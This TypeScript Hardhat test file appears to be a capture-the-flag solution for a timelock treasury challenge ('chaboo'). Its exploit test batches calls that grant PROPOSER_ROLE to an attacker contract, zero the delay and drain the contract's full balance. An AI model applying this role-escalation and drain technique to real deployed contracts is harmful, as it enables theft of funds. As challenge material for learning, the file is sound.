import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_chaboo, CHALLENGE_chaboo} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/chaboo/Setup.sol:Setup`, SETUP_chaboo)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/chaboo/SwissTreasury.sol:SwissTreasury`, CHALLENGE_chaboo)).connect(attacker);
    // expect(await setup.isSolved()).to.eq(true);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_chaboo);
});

it('Exploit', async function () {

    let PROPOSER_ROLE = await ethers.utils.keccak256(
        await ethers.utils.toUtf8Bytes("PROPOSER_ROLE")
    )

    let challengeAddress = await challenge.address;

    exploit = await (await ethers.getContractFactory("contracts/chaboo/Exploit.sol:Exploit", attacker)).deploy();
    let exploitAddress = await exploit.address;

    let targets = [challengeAddress, challengeAddress, exploitAddress, challengeAddress];
    let values = [0, 0, 0, 0];
    // let salt = await ethers.utils.solidityKeccak256(["string"], ["0x"]);
    let salt = "0x0000000000000000000000000000000000000000000000000000000000000000";

    let iface1 = new ethers.utils.Interface(["function updateDelay(uint256 newDelay)"]);
    let iface2 = new ethers.utils.Interface(["function grantRole(bytes32 role, address account)"]);
    let iface3 = new ethers.utils.Interface(["function distributeFunds(address target, uint256 value)"]);
    let iface4 = new ethers.utils.Interface(["function doStuff(address _attacker, address payable _thisTimelock)"]);

    let amount = await ethers.provider.getBalance(challengeAddress);

    let data = [
        iface2.encodeFunctionData("grantRole", [PROPOSER_ROLE, exploitAddress]),
        iface1.encodeFunctionData("updateDelay", [0]),
        iface4.encodeFunctionData("doStuff", [attackerAddress, challengeAddress]),
        iface3.encodeFunctionData("distributeFunds", [exploitAddress, amount])
    ];

    await challenge.connect(attacker).executeBatch(targets, values, data, salt, salt);

    // expect(await challenge.getMinDelay()).to.eq(0);

    expect(await setup.isSolved()).to.eq(true);
    });